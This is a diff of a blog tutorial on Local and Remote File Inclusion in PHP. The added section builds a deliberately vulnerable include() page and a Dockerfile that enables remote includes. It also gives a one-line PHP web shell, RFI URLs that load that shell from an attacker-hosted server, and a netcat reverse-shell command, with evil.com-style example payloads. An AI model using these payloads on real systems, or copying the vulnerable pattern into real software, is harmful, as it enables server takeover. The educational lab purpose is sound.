@@ -1,15 +1,14 @@
 ---
-title: "Local File Inclusion"
-draft: false
+title: File inclusion
 Date: 2024-10-11
 image: avatar.png
 autoimage: yes
 description: Dexter
-categories: 'Web Security'
-author: 'Dexter'
+Categories: Web Security
+author: Dexter
 comments: true
----
 
+---
 In web application security, vulnerabilities come in many forms including Local File Inclusion. LFI is a web vulnerability that allows attackers to include files on a server through the web browser. If exploited this can lead to sensitive information disclosure, privilege escalation or even full remote code execution.
 
 In this blog post we will explore what LFI is, how it works, and how attackers exploit it. We will also discuss steps developers and security proffessionals can take to mitigate the risk.
@@ -133,6 +132,152 @@ We then get a response with the passwd file contents. Success!
 
 ![5](https://i.ibb.co/RvGC82Q/response-with-passwd.png)
 
+
+## Extras
+In the main post, we explored **Local File Inclusion (LFI)**, a vulnerability where an attacker can include and access local files on the server. However, there’s a related attack called **Remote File Inclusion (RFI)** that works similarly but with a key difference—attackers can include **external files** from remote servers. This file inclusion vulnerability allows an attacker to include a file, usually exploiting a dynamic file inclusion mechanism that has been implemented in the target location. Occurring due to improper input validation.
+This could then lead to file contents disclosure. Depending on the severity this could then lead to worse.
+This would allow two main benefits:
+- Enumerating local only ports and web apps (SSRF)
+- Gaining RCE by including malicious scripts that we host ourselves
+
+### Demonstrating LFI and RFI
+To better understand how file inclusion works, we can go ahead and create a welcome page that can be exploited if not properly secured. I will be using docker to create containers locally.
+
+```php
+<?php
+// RFI Vulnerability - Do NOT use in production
+if(isset($_GET['page'])) {
+    $include_file = $_GET['page'];
+    include($include_file); // Dangerous inclusion without validation
+}
+
+
+#$include_file = str_replace(array("http://", "https://"), "", $include_file);
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vulnerable Welcome Page</title>
+</head>
+<body>
+    <h1>Welcome to Our Site!</h1>
+    <p>This is a simple welcome page with an intentional RFI vulnerability.</p>
+
+    <!-- Normal page content -->
+    <div style="border: 1px solid #ccc; padding: 20px; margin: 20px;">
+        <h2>About Us</h2>
+        <p>We're a demo company showing PHP security concepts.</p>
+    </div>
+
+    <!-- Hidden RFI trigger (could also be in URL parameters) -->
+    <!-- Normally this would be a dynamic module loader in real applications -->
+    <!-- Example vulnerable URL: ?page=http://attacker.com/malicious.txt -->
+</body>
+</html>
+```
+
+We can also set this up using docker with a `php` image like below
+
+```Dockerfile
+#latest PHP image
+
+FROM php:8.2-apache
+
+
+RUN apt-get update && apt-get install -y busybox python3
+
+
+RUN echo "allow_url_include=1" >> /usr/local/etc/php/php.ini && \
+    echo "allow_url_fopen=1" >> /usr/local/etc/php/php.ini
+
+COPY welcome.php /var/www/html/welcome.php
+
+
+#WORKDIR /var/www/html
+
+EXPOSE 80
+```
+
+![welcome.php](https://i.ibb.co/994TtXjX/image.png)
+
+
+### Exploiting LFI
+
+In our example we can add the `../../../etc/passwd` to prove that we can exploit local file inclusion in our local web application. 
+
+![LFI](https://i.ibb.co/DDR1x2mH/image.png)
+
+### Exploiting RFI 
+To  demonstrate remote file inclusion, we can create a payload script that will allow us to execute system commands once it is included on the vulnerable server. Since `RFI` allows us to load remote files, we can host the payload on our own server and inject it into the vulnerable site.
+
+```php
+<?php
+
+system($_GET["cmd"]);
+
+?>
+```
+
+On our attacker machine we could start a python server by 
+```python
+python3 -m http.server 8001
+```
+
+Then we could add this parameter on the site
+
+```
+?page=http://192.168.226.128:8001/shell.php
+```
+
+![rfi](https://i.ibb.co/jZzJSwv6/image.png)
+
+We can then confirm on our server that this file has been included. 
+
+![pythonserver](https://i.ibb.co/8LDgxj6Z/image.png)
+
+We can then try and execute commands to show that this works. 
+
+```
+?page=http://192.168.226.128:8001/shell.php&cmd=id
+```
+
+![id](https://i.ibb.co/SXMMrHFM/image.png)
+
+And with that we have successfully exploited the `RFI` vulnerability. 
+Maybe we can now try and have some fun and have the machine connect back to us and give us a shell. 
+First we are gonna need to start a listener on our attacker machine that will listen to any connections back 
+
+```
+nc -lnvp 4444
+```
+
+And now we can add the following parameter to our request. The payload has been url encoded just for measure. 
+```
+?page=http://192.168.226.128:8001/shell.php&cmd=busybox%20nc%20192.168.226.128%204444%20-e%20bash
+```
+
+And we do get a connection back and we can work towards escalating our privileges. 
+
+![shell](https://i.ibb.co/kgJJ8WFz/image.png)
+
+
+### LFI vs RFI 
+
+While both `LFI` and `RFI` are file inclusion vulnerabilities, they do have their distinct behaviors and risks. Here are some key differences. 
+
+| **Feature**            | **LFI (Local File Inclusion)**                    | **RFI (Remote File Inclusion)**                 |
+|------------------------|--------------------------------------------------|------------------------------------------------|
+| **File Source**         | Local files on the server                        | Remote files from external URLs                |
+| **Attack Method**       | Reads or executes local files                    | Loads and executes external scripts            |
+| **Potential Impact**    | Information disclosure, code execution (if combined with log poisoning) | Remote Code Execution (RCE), full system compromise |
+| **Example Payload**     | `vulnerable.php?page=/etc/passwd`                | `vulnerable.php?page=http://evil.com/payload.php` |
+| **Works When**          | The server has important local files that can be accessed | `allow_url_include = On` (which allows remote scripts) |
+| **Common Exploits**     | `/etc/passwd`, `php://filter`, `log poisoning`    | Hosting a malicious script remotely and executing it |
+
+
 ## How to Prevent a Directory Traversal Attack
 
 The most effective way to prevent file path traversal vulnerabilities is to avoid passing user-supplied input to filesystem APIs altogether. Many application functions that do this can be rewritten to deliver the same behavior in a safer way.
@@ -147,5 +292,6 @@ So that will be all. Enjoy!
 ## Comments
 
 {{< chat disqus_thread >}}
+
 
 ---
